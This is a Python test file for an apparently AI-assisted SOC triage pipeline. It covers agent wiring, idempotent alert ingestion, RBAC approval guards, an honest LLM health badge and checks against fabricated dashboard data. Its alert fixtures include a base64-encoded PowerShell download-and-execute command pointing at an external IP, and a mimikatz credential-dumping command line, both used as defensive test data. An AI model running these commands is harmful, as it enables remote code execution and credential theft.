# -*- coding: utf-8 -*-
"""
tests/test_runtime_wiring_security.py
Kiểm thử tích hợp & hồi quy cho Wave 2 Runtime Wiring, Idempotent Ingestion,
RBAC UI Delegation, Honest LLM Health Badge, Dynamic Dashboard Grounding và Offline CLI Check.
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from starlette.testclient import TestClient

from src.agents.ingestion_agent import IngestionAgent
from src.api.webhook_server import DEFAULT_SECRET, WebhookService, create_app
from src.copilot.llm_provider import HybridLLMProvider
from src.core import config as core_config
from src.core import rbac as core_rbac
from src.core.incident_store import IncidentStore
from src.core.orchestrator import StateGraphOrchestrator, create_full_soc_pipeline
from src.core.schemas import (
    ActionType,
    IncidentStatus,
    LLMHealthStatus,
    ParsedEvent,
    RawLogInput,
    RecommendedAction,
    SeverityLevel,
    TriageOutput,
)
from src.core.state import IncidentState
from src.ui import components as ui_components
from src.ui import dashboard as ui_dashboard


PROJECT_ROOT = Path(__file__).resolve().parent.parent


class TestOrchestratorWiringAndHashFix(unittest.TestCase):
    """Kiểm thử wiring 6 agents dùng chung LLM/RAG, set_llm_provider và sửa lỗi hash."""

    def test_create_full_soc_pipeline_wires_shared_llm_and_rag(self):
        pipeline = create_full_soc_pipeline()

        self.assertFalse(pipeline.auto_approve)
        self.assertFalse(pipeline.enable_parallel_investigation)
        self.assertIsNotNone(pipeline.llm_provider)
        self.assertIsNotNone(pipeline.rag_kb)

        agents = [
            pipeline.ingestion_agent,
            pipeline.triage_agent,
            pipeline.threat_intel_agent,
            pipeline.rca_agent,
            pipeline.response_agent,
            pipeline.reporting_agent,
        ]
        for agent in agents:
            self.assertIsNotNone(agent)
            self.assertIs(getattr(agent, "llm_provider", None), pipeline.llm_provider)

        self.assertIs(pipeline.response_agent.rag_kb, pipeline.rag_kb)
        self.assertTrue(pipeline.threat_intel_agent.llm_enabled)

        det_pipeline = create_full_soc_pipeline(
            llm_provider=HybridLLMProvider(provider_mode="deterministic"),
            llm_enabled=False,
        )
        self.assertFalse(det_pipeline.threat_intel_agent.llm_enabled)
        self.assertEqual(det_pipeline.threat_intel_agent.llm_provider.provider_mode, "deterministic")

    def test_orchestrator_fallback_response_node_never_fabricates_hardcoded_ip(self):
        from src.eval.grounding import audit_case_grounding

        orch = StateGraphOrchestrator(response_agent=None)
        state = IncidentState(
            incident_id="INC-NO-FAKE-IP-001",
            parsed_events=[
                ParsedEvent(
                    event_id="Sysmon-1",
                    source_type="Sysmon",
                    host_name="WS-FIN-09",
                    process_name="mimikatz.exe",
                    command_line="mimikatz.exe sekurlsa::logonpasswords",
                    source_ip="10.0.0.15",
                )
            ],
        )
        out = orch.response_node(state)
        action_types = [a.action_type for a in out.recommended_actions]
        targets = [a.target for a in out.recommended_actions]
        self.assertNotIn(ActionType.BLOCK_IP, action_types)
        self.assertNotIn("194.26.29.112", targets)
        self.assertIn(ActionType.ISOLATE_HOST, action_types)
        self.assertIn(ActionType.KILL_PROCESS, action_types)

        audit = audit_case_grounding(out)
        self.assertFalse(audit.has_hallucination, msg=f"Unexpected ungrounded entities: {audit}")

        # When a real external IP exists in state.parsed_events or state.threat_intel, BLOCK_IP IS created
        state_with_ip = IncidentState(
            incident_id="INC-REAL-IP-001",
            parsed_events=[
                ParsedEvent(
                    event_id="Sysmon-3",
                    source_type="Sysmon",
                    host_name="WS-FIN-09",
                    process_name="powershell.exe",
                    dest_ip="203.0.113.55",
                )
            ],
        )
        out_ip = orch.response_node(state_with_ip)
        block_actions = [a for a in out_ip.recommended_actions if a.action_type == ActionType.BLOCK_IP]
        self.assertEqual(len(block_actions), 1)
        self.assertEqual(block_actions[0].target, "203.0.113.55")

    def test_set_llm_provider_propagates_to_all_six_agents(self):
        pipeline = create_full_soc_pipeline()

        class DummyProvider:
            def generate_response(self, prompt, system_prompt=None, **kwargs):
                return "ok"

        new_provider = DummyProvider()
        pipeline.set_llm_provider(new_provider)

        self.assertIs(pipeline.llm_provider, new_provider)
        for agent in (
            pipeline.ingestion_agent,
            pipeline.triage_agent,
            pipeline.threat_intel_agent,
            pipeline.rca_agent,
            pipeline.response_agent,
            pipeline.reporting_agent,
        ):
            self.assertIs(agent.llm_provider, new_provider)

    def test_enrichment_node_fallback_strips_hash_prefixes_and_deduplicates(self):
        orch = StateGraphOrchestrator()
        sha256_upper = "2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91"
        md5_hex = "d41d8cd98f00b204e9800998ecf8427e"

        state = IncidentState(
            incident_id="INC-HASH-FIX-001",
            parsed_events=[
                ParsedEvent(
                    event_id="Sysmon-1",
                    source_type="Sysmon",
                    process_name="powershell.exe",
                    file_hash=f"SHA256={sha256_upper},MD5={md5_hex}",
                ),
                ParsedEvent(
                    event_id="Sysmon-11",
                    source_type="Sysmon",
                    process_name="powershell.exe",
                    file_hash=f"sha256={sha256_upper.lower()}",
                ),
            ],
        )

        enriched = orch.enrichment_node(state)
        iocs = enriched.threat_intel.extracted_iocs
        sha_items = [i for i in iocs if i.value.lower() == sha256_upper.lower()]
        md5_items = [i for i in iocs if i.value.lower() == md5_hex.lower()]

        self.assertEqual(len(sha_items), 1)
        self.assertEqual(sha_items[0].ioc_type, "SHA256")
        self.assertEqual(sha_items[0].value, sha256_upper)
        self.assertEqual(len(md5_items), 1)
        self.assertEqual(md5_items[0].ioc_type, "MD5")


class TestIdempotentIngestion(unittest.TestCase):
    """Kiểm thử tính idempotent qua cả 4 entrypoint ingestion."""

    def setUp(self):
        self.agent = IngestionAgent()
        self.sample_alert = {
            "id": "wazuh-idem-001",
            "timestamp": "2026-10-20T09:00:00Z",
            "rule": {
                "id": "92211",
                "level": 12,
                "description": "Suspicious PowerShell Encoded",
                "groups": ["windows", "sysmon"],
                "mitre": {"id": ["T1059.001"]},
            },
            "agent": {"id": "002", "name": "WIN10-LAB", "ip": "192.168.1.105"},
            "data": {
                "win": {
                    "eventdata": {
                        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "commandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
                        "destinationIp": "194.26.29.112",
                        "hashes": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
                    }
                }
            },
        }

    def test_process_state_and_orchestrator_ingestion_node_idempotent(self):
        state = self.agent.process(self.sample_alert, incident_id="INC-IDEM-001")
        self.assertEqual(len(state.parsed_events), 1)

        # Re-run process_state twice
        self.agent.process_state(state)
        self.agent.process_state(state)
        self.assertEqual(len(state.parsed_events), 1)
        prelim = state.parsed_events[0].raw_attributes.get("preliminary_iocs", [])
        keys = [(x["type"], x["value"].lower()) for x in prelim]
        self.assertEqual(len(keys), len(set(keys)))

        # Run orchestrator.ingestion_node (with agent and without agent)
        orch_with_agent = StateGraphOrchestrator(ingestion_agent=self.agent)
        state = orch_with_agent.ingestion_node(state)
        self.assertEqual(len(state.parsed_events), 1)

        orch_fallback = StateGraphOrchestrator(ingestion_agent=None)
        state = orch_fallback.ingestion_node(state)
        self.assertEqual(len(state.parsed_events), 1)

    def test_parse_wazuh_alert_and_parse_zeek_log_idempotent(self):
        state = IncidentState(incident_id="INC-IDEM-002")
        self.agent.parse_wazuh_alert(self.sample_alert, state=state)
        self.agent.parse_wazuh_alert(self.sample_alert, state=state)
        self.assertEqual(len(state.parsed_events), 1)

        zeek_1 = {"ts": 1700000001.1, "id.orig_h": "10.0.0.5", "id.resp_h": "194.26.29.112", "id.resp_p": 443}
        zeek_2 = {"ts": 1700000009.9, "id.orig_h": "10.0.0.5", "id.resp_h": "194.26.29.112", "id.resp_p": 443}
        self.agent.parse_zeek_log(zeek_1, state=state)
        self.agent.parse_zeek_log(zeek_1, state=state)
        self.assertEqual(len(state.parsed_events), 2)
        self.agent.parse_zeek_log(zeek_2, state=state)
        self.assertEqual(len(state.parsed_events), 3)

    def test_webhook_service_no_double_ingestion(self):
        tmp_dir = tempfile.mkdtemp(prefix="test_webhook_idem_")
        try:
            store = IncidentStore(storage_dir=tmp_dir)
            svc = WebhookService(
                incident_store=store,
                secret_token=DEFAULT_SECRET,
                allowed_ips=["*"],
                min_level=7,
            )
            self.assertIsNotNone(svc.orchestrator.triage_agent)
            self.assertIsNotNone(svc.orchestrator.reporting_agent)
            self.assertFalse(svc.orchestrator.auto_approve)

            app = create_app(svc)
            client = TestClient(app)
            res = client.post(
                "/api/v1/wazuh-alert",
                json=self.sample_alert,
                headers={"X-Wazuh-Secret-Token": DEFAULT_SECRET},
            )
            self.assertEqual(res.status_code, 202)
            inc_id = res.json()["incident_id"]
            saved = store.get_incident(inc_id)
            self.assertIsNotNone(saved)
            self.assertEqual(len(saved.raw_logs), 1)
            self.assertEqual(len(saved.parsed_events), 1)
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)


class TestComponentsRBACAndHealthBadge(unittest.TestCase):
    """Kiểm thử delegation RBAC và render_llm_health_badge trung thực."""

    def test_components_reexports_core_rbac(self):
        self.assertIs(ui_components.ROLE_SOC_ANALYST, core_rbac.ROLE_SOC_ANALYST)
        self.assertIs(ui_components.ROLE_TIER1, core_rbac.ROLE_TIER1)
        self.assertIs(ui_components.ROLE_SOC_MANAGER, core_rbac.ROLE_SOC_MANAGER)
        self.assertIs(ui_components.has_permission, core_rbac.has_permission)
        self.assertIs(ui_components.enforce_hitl_rbac, core_rbac.enforce_hitl_rbac)
        self.assertIs(ui_components.is_protected_process, core_rbac.is_protected_process)
        self.assertIs(ui_components.can_user_approve_action, core_rbac.can_user_approve_action)

    def test_apply_hitl_action_decision_guards_tier1_and_protected_processes(self):
        state = IncidentState(
            incident_id="INC-RBAC-UI-001",
            recommended_actions=[
                RecommendedAction(
                    action_id="ACT-001",
                    action_type=ActionType.ISOLATE_HOST,
                    target="WIN10-01",
                    description="Isolate host",
                    priority=1,
                ),
                RecommendedAction(
                    action_id="ACT-002",
                    action_type=ActionType.KILL_PROCESS,
                    target="lsass.exe",
                    description="Kill lsass",
                    priority=1,
                ),
            ],
        )

        # Tier 1 cannot approve ISOLATE_HOST
        ui_components.apply_hitl_action_decision(
            state, 0, "APPROVE", user_role=ui_components.ROLE_TIER1
        )
        self.assertIsNone(state.recommended_actions[0].is_approved)

        # Even SOC Manager cannot approve KILL_PROCESS on protected lsass.exe
        ui_components.apply_hitl_action_decision(
            state, 1, "APPROVE", user_role=ui_components.ROLE_SOC_MANAGER
        )
        self.assertIsNone(state.recommended_actions[1].is_approved)

    @patch("streamlit.markdown")
    def test_render_llm_health_badge_never_fakes_online(self, mock_md):
        # 1. None provider -> Offline
        res_none = ui_components.render_llm_health_badge(None)
        self.assertEqual(res_none["status"], "offline")
        self.assertFalse(res_none["connected"])
        self.assertNotIn("Online", res_none["badge"])

        # 2. Unreachable HybridLLMProvider with fallback -> Degraded, not Online
        provider_fb = HybridLLMProvider(provider_mode="omnirouter", enable_fallback=True)
        with patch.object(
            provider_fb,
            "check_health",
            return_value=LLMHealthStatus(
                connected=False,
                active_provider="deterministic",
                configured_mode="omnirouter",
                model="AICODE",
                error="Connection refused",
            ),
        ):
            res_fb = ui_components.render_llm_health_badge(provider_fb)
        self.assertEqual(res_fb["status"], "degraded")
        self.assertFalse(res_fb["connected"])
        self.assertNotIn("Online", res_fb["badge"])

        # 3. Unreachable without fallback -> Offline
        provider_no_fb = HybridLLMProvider(provider_mode="omnirouter", enable_fallback=False)
        with patch.object(
            provider_no_fb,
            "check_health",
            return_value=LLMHealthStatus(
                connected=False,
                active_provider="none",
                configured_mode="omnirouter",
                model="AICODE",
                error="Connection refused",
            ),
        ):
            res_off = ui_components.render_llm_health_badge(provider_no_fb)
        self.assertEqual(res_off["status"], "offline")
        self.assertFalse(res_off["connected"])
        self.assertNotIn("Online", res_off["badge"])

        # 4. Minimal mock lacking check_health -> never claims Online
        class MinimalMockLLM:
            def generate_response(self, prompt, system_prompt=None):
                return "ok"

        res_mock = ui_components.render_llm_health_badge(MinimalMockLLM())
        self.assertFalse(res_mock["connected"])
        self.assertNotIn("Online", res_mock["badge"])

        # 5. Reachable -> Online
        with patch.object(
            provider_fb,
            "check_health",
            return_value=LLMHealthStatus(
                connected=True,
                active_provider="omnirouter",
                configured_mode="omnirouter",
                model="AICODE",
                latency_ms=12.4,
            ),
        ):
            res_on = ui_components.render_llm_health_badge(provider_fb)
        self.assertEqual(res_on["status"], "online")
        self.assertTrue(res_on["connected"])
        self.assertIn("Online", res_on["badge"])
        self.assertTrue(mock_md.called)


class TestDashboardGroundingAndCLIHygiene(unittest.TestCase):
    """Kiểm thử dynamic grounding trong dashboard, headless check, CLI check và static hygiene."""

    def test_dashboard_dynamic_helpers_handle_benign_pending_and_mock_report(self):
        pending_state = IncidentState(
            incident_id="INC-DYN-001",
            status=IncidentStatus.AWAITING_APPROVAL,
            triage_result=TriageOutput(
                is_incident=True,
                confidence_score=0.9,
                severity=SeverityLevel.MEDIUM,
                summary="SSH brute force from 203.0.113.5",
            ),
            recommended_actions=[
                RecommendedAction(
                    action_id="ACT-1",
                    action_type=ActionType.BLOCK_IP,
                    target="203.0.113.5",
                    description="Block attacker IP",
                    priority=1,
                    require_human_approval=True,
                    is_approved=None,
                )
            ],
        )
        # Unconfigured Mock report attached post-init must not crash or fake fields
        object.__setattr__(pending_state, "final_report", MagicMock())

        op = ui_dashboard._extract_grounded_operational_metrics(pending_state)
        self.assertNotIn("8 phút", op["mtta"])
        self.assertNotIn("3h45m", op["mttr"])

        impact = ui_dashboard._extract_grounded_impact(pending_state)
        self.assertNotIn("450.000.000", impact["financial_note"])
        self.assertIn("Không phát hiện dữ liệu cá nhân (PII)", impact["compliance_note"])

        gates = ui_dashboard._extract_grounded_verification_gate(pending_state)
        hitl_gate = next(g for g in gates if "HITL" in g["label"])
        self.assertFalse(hitl_gate["checked"])

        benign_state = IncidentState(
            incident_id="INC-BENIGN-001",
            status=IncidentStatus.CLOSED_FALSE_POSITIVE,
            triage_result=TriageOutput(
                is_incident=False,
                confidence_score=0.95,
                severity=SeverityLevel.LOW,
                summary="Routine admin logon",
            ),
        )
        applicable_whys, _ = ui_dashboard._extract_grounded_five_whys(benign_state)
        applicable_ishi, _ = ui_dashboard._extract_grounded_ishikawa(benign_state)
        self.assertFalse(applicable_whys)
        self.assertFalse(applicable_ishi)

    def test_run_dashboard_headless_check_passes(self):
        res = ui_dashboard.run_dashboard_headless_check()
        self.assertTrue(res)
        self.assertIsInstance(res, dict)
        self.assertTrue(res.get("ok"))
        self.assertEqual(res.get("pipeline_agents"), 6)
        self.assertTrue(res.get("shared_llm_provider"))
        self.assertTrue(res.get("shared_rag_kb"))

    def test_run_live_soc_check_only_exits_zero(self):
        env = os.environ.copy()
        env["PYTHONPATH"] = str(PROJECT_ROOT)
        env["SOC_SKIP_DOTENV"] = "1"
        proc = subprocess.run(
            [sys.executable, "run_live_soc.py", "--check-only"],
            cwd=str(PROJECT_ROOT),
            env=env,
            capture_output=True,
            text=True,
            timeout=60,
        )
        self.assertEqual(proc.returncode, 0, msg=f"STDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}")
        self.assertIn("Headless check PASS", proc.stdout)

    def test_load_project_env_skips_under_pytest_and_not_called_on_imports(self):
        with tempfile.NamedTemporaryFile("w", suffix=".env", delete=False) as tmp:
            tmp.write("WAZUH_OVA_IP=198.51.100.77\n")
            tmp_path = tmp.name

        old_val = os.environ.pop("WAZUH_OVA_IP", None)
        try:
            self.assertFalse(core_config.load_project_env(env_path=tmp_path, force=False))
            self.assertIsNone(os.environ.get("WAZUH_OVA_IP"))

            self.assertTrue(core_config.load_project_env(env_path=tmp_path, force=True))
            self.assertEqual(core_config.get_wazuh_ova_ip(), "198.51.100.77")
        finally:
            os.environ.pop("WAZUH_OVA_IP", None)
            if old_val is not None:
                os.environ["WAZUH_OVA_IP"] = old_val
            os.remove(tmp_path)

        # Ensure importing dashboard, webhook_server, run_live_soc does NOT call load_project_env()
        code = (
            "from unittest.mock import patch\n"
            "with patch('src.core.config.load_project_env') as m:\n"
            "    import src.ui.dashboard\n"
            "    import src.api.webhook_server\n"
            "    import run_live_soc\n"
            "    assert m.call_count == 0, f'Unexpected top-level load_project_env calls: {m.call_count}'\n"
            "print('IMPORT_CLEAN')\n"
        )
        env = os.environ.copy()
        env["PYTHONPATH"] = str(PROJECT_ROOT)
        proc = subprocess.run(
            [sys.executable, "-c", code],
            cwd=str(PROJECT_ROOT),
            env=env,
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(proc.returncode, 0, msg=proc.stderr)
        self.assertIn("IMPORT_CLEAN", proc.stdout)

    def test_owned_files_have_zero_hardcoded_lab_ips_or_fabricated_metrics(self):
        owned_files = [
            PROJECT_ROOT / "src" / "agents" / "ingestion_agent.py",
            PROJECT_ROOT / "src" / "core" / "orchestrator.py",
            PROJECT_ROOT / "src" / "ui" / "components.py",
            PROJECT_ROOT / "src" / "ui" / "dashboard.py",
            PROJECT_ROOT / "src" / "api" / "webhook_server.py",
            PROJECT_ROOT / "run_live_soc.py",
        ]
        forbidden_patterns = [
            r"450\.000\.000",
            r"3h45m",
            r"MTTA:\*\*\s*8\s*phút",
            r"MTTA:\s*8\s*phút",
            r"172\.16\.65\.143",
            r"172\.16\.65\.150",
        ]
        combined_re = re.compile("|".join(forbidden_patterns))
        for fpath in owned_files:
            content = fpath.read_text(encoding="utf-8")
            match = combined_re.search(content)
            self.assertIsNone(
                match,
                msg=f"Found forbidden hardcoded string {match.group(0) if match else None!r} in {fpath}",
            )
        orch_content = (PROJECT_ROOT / "src" / "core" / "orchestrator.py").read_text(encoding="utf-8")
        self.assertNotIn("194.26.29.112", orch_content)


if __name__ == "__main__":
    unittest.main()
